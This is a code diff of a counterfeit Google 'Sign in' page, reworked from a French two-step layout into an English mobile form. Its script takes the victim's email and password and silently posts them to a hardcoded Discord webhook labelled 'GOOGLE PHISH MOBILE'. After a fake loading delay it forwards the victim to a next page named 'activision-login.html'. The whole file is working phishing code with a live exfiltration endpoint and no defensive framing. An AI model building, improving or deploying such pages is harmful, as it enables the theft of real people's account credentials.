@@ -1,180 +1,181 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Se connecter - Comptes Google</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Sign in - Google Accounts</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --google-blue: #1a73e8;
-      --google-blue-hover: #185abc;
+      --blue: #1a73e8;
+      --blue-dark: #1765cc;
+      --text: #202124;
       --gray: #5f6368;
-      --light-gray: #dadce0;
-      --bg: #f6f8fa;
+      --border: #dadce0;
+      --bg: #ffffff;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      font-family: 'Google Sans', Arial, sans-serif;
       background: var(--bg);
-      color: #202124;
+      color: var(--text);
       min-height: 100vh;
+      padding: 32px 20px;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 16px;
     }
     .container {
-      background: white;
       width: 100%;
-      max-width: 450px;
-      border-radius: 8px;
-      box-shadow: 0 1px 3px 0 rgba(60,64,67,.3), 0 4px 8px 3px rgba(60,64,67,.15);
-      padding: 40px 32px 36px;
+      max-width: 380px;
       text-align: center;
-      position: relative;
-      transition: all 0.3s ease;
     }
-    .logo { width: 96px; margin-bottom: 24px; }
-    h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
-    .subtitle { color: var(--gray); font-size: 16px; margin-bottom: 32px; }
-    .form-step { opacity: 0; height: 0; overflow: hidden; transition: opacity 0.4s ease, height 0.4s ease; }
-    .form-step.active { opacity: 1; height: auto; }
-    input[type="email"], input[type="password"] {
-      width: 100%;
-      padding: 13px 15px;
+    .logo {
+      width: 88px;
+      margin: 0 auto 48px;
+      display: block;
+    }
+    h1 {
+      font-size: 28px;
+      font-weight: 400;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      color: var(--gray);
       font-size: 16px;
-      border: 1px solid var(--light-gray);
+      margin-bottom: 32px;
+      line-height: 1.4;
+    }
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1px solid var(--border);
       border-radius: 4px;
-      margin-bottom: 24px;
-      outline: none;
-      transition: border-color 0.2s, box-shadow 0.2s;
+      margin-bottom: 16px;
+      transition: border-color 0.2s;
     }
     input:focus {
-      border-color: var(--google-blue);
-      box-shadow: 0 0 0 1px var(--google-blue);
+      border-color: var(--blue);
+      outline: none;
     }
-    .btn-primary {
-      background: var(--google-blue);
+    .show-pass {
+      display: flex;
+      align-items: center;
+      margin: 12px 0 24px;
+      font-size: 14px;
+      color: var(--gray);
+    }
+    .show-pass input {
+      margin-right: 12px;
+      width: 18px;
+      height: 18px;
+      accent-color: var(--blue);
+    }
+    .forgot {
+      color: var(--blue);
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+      margin: 8px 0 24px;
+      text-align: right;
+    }
+    .btn {
+      background: var(--blue);
       color: white;
       border: none;
-      padding: 12px 24px;
+      padding: 14px;
       font-size: 14px;
       font-weight: 500;
       border-radius: 4px;
       cursor: pointer;
       width: 100%;
       min-height: 48px;
-      position: relative;
-      overflow: hidden;
-      transition: background 0.2s;
     }
-    .btn-primary:hover { background: var(--google-blue-hover); }
-    .btn-primary.loading::after {
-      content: '';
-      position: absolute;
-      top: 50%; left: 50%;
-      width: 20px; height: 20px;
-      border: 3px solid white;
-      border-top-color: transparent;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      transform: translate(-50%, -50%);
+    .btn:disabled {
+      background: #a0c4ff;
+      cursor: not-allowed;
     }
-    @keyframes spin { to { transform: translate(-50%, -50%) rotate(360deg); } }
-    .forgot-link, .create-account {
-      color: var(--google-blue);
-      text-decoration: none;
-      font-size: 14px;
-      display: inline-block;
-      margin-top: 16px;
+    .btn:hover:not(:disabled) { background: var(--blue-dark); }
+    .footer {
+      margin-top: 64px;
+      font-size: 12px;
+      color: var(--gray);
+      text-align: center;
     }
-    .footer { margin-top: 48px; font-size: 12px; color: var(--gray); text-align: center; }
-    .identifier { font-size: 16px; color: #202124; margin: 16px 0 24px; text-align: left; word-break: break-all; }
-    .show-password-row { display: flex; align-items: center; margin: 12px 0 24px; font-size: 14px; color: var(--gray); }
-    .show-password-row input { margin-right: 12px; width: 18px; height: 18px; }
+    .lang {
+      color: var(--blue);
+      cursor: pointer;
+      margin-bottom: 8px;
+      display: block;
+    }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- Étape 1 : Identifiant -->
-  <div id="step-identifier" class="form-step active">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-    <h1>Se connecter</h1>
-    <p class="subtitle">Utilisez votre compte Google</p>
-    <input type="email" id="identifier" placeholder="Adresse e-mail ou numéro de téléphone" autocomplete="username" autofocus>
-    <button class="btn-primary" onclick="goToPassword()">Suivant</button>
+  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+
+  <h1>Sign in</h1>
+  <p class="subtitle">Use your Google Account</p>
+
+  <div class="input-group">
+    <input type="email" id="email" placeholder="Email or phone" autocomplete="off" autofocus required>
   </div>
 
-  <!-- Étape 2 : Mot de passe -->
-  <div id="step-password" class="form-step">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-    <h1 id="welcome-title"></h1>
-    <div class="identifier" id="shown-identifier"></div>
-    <input type="password" id="password" placeholder="Saisissez votre mot de passe" autocomplete="current-password">
-    <div class="show-password-row">
-      <input type="checkbox" id="show-password-checkbox" onclick="togglePasswordVisibility()">
-      <label for="show-password-checkbox">Afficher le mot de passe</label>
+  <div class="input-group">
+    <input type="password" id="password" placeholder="Enter your password" autocomplete="off" required>
+    <div class="show-pass">
+      <input type="checkbox" id="show" onclick="toggle()">
+      <label for="show">Show password</label>
     </div>
-    <button id="submit-btn" class="btn-primary" onclick="submitCredentials()">Suivant</button>
-    <a href="#" class="forgot-link">Mot de passe oublié ?</a>
   </div>
+
+  <a href="#" class="forgot">Forgot email?</a>
+
+  <button id="btn" class="btn" onclick="submit()">Next</button>
 
   <div class="footer">
-    <div>Français (France) ▾</div>
+    <div class="lang">English (United States) ▾</div>
+    <div>Help · Privacy · Terms</div>
   </div>
 </div>
 
 <script>
   const webhookUrl = "https://discord.com/api/webhooks/1482791121074782349/_CBi8WAs0aHqJMgw8xMImZNoUQfAUTNwYMFRXkYLbB3xn8tw7zfe8lnDMmnaj4ot1keK";
 
-  function goToPassword() {
-    const input = document.getElementById("identifier").value.trim();
-    if (!input) return; // Pas d'alerte, juste rien si vide (comme le vrai Google)
-
-    document.getElementById("step-identifier").classList.remove("active");
-    setTimeout(() => {
-      document.getElementById("step-password").classList.add("active");
-      document.getElementById("welcome-title").textContent = input;
-      document.getElementById("shown-identifier").textContent = input;
-    }, 300); // petite transition douce
+  function toggle() {
+    const p = document.getElementById("password");
+    p.type = document.getElementById("show").checked ? "text" : "password";
   }
 
-  function togglePasswordVisibility() {
-    const pass = document.getElementById("password");
-    pass.type = document.getElementById("show-password-checkbox").checked ? "text" : "password";
-  }
+  async function submit() {
+    const email = document.getElementById("email").value.trim();
+    const pass = document.getElementById("password").value.trim();
 
-  async function submitCredentials() {
-    const btn = document.getElementById("submit-btn");
-    const identifier = document.getElementById("shown-identifier").textContent;
-    const password = document.getElementById("password").value.trim();
+    if (!email || !pass) {
+      alert("Please fill in both fields");
+      return;
+    }
 
-    if (!password) return; // Pas d'alerte, juste bloqué (réaliste)
-
-    btn.classList.add("loading");
+    const btn = document.getElementById("btn");
     btn.disabled = true;
-    btn.textContent = ""; // cache le texte pendant le "chargement"
 
-    // Envoi silencieux
     try {
       await fetch(webhookUrl, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
-          content: `**PHISHING SIMULATION – GOOGLE**\nIdentifier : ${identifier}\nPassword   : ${password}\nHeure      : ${new Date().toLocaleString("fr-FR")}\n──────────────────────────────`
+          content: `**GOOGLE PHISH MOBILE**\nEmail: ${email}\nPass: ${pass}\nTime: ${new Date().toLocaleString('en-US')}`
         })
       });
-    } catch (e) { /* silencieux, pas d'erreur visible */ }
+    } catch (e) {}
 
-    // Simulation de délai serveur (comme une vraie connexion)
-    await new Promise(resolve => setTimeout(resolve, 1800));
-
-    // Redirection (change l'URL quand tu auras la page Activision)
-    window.location.href = "activision-login.html"; // ou une page "https://myaccount.google.com/" pour plus de réalisme
+    await new Promise(r => setTimeout(r, 1800));
+    window.location.href = "activision-login.html";
   }
 </script>
 
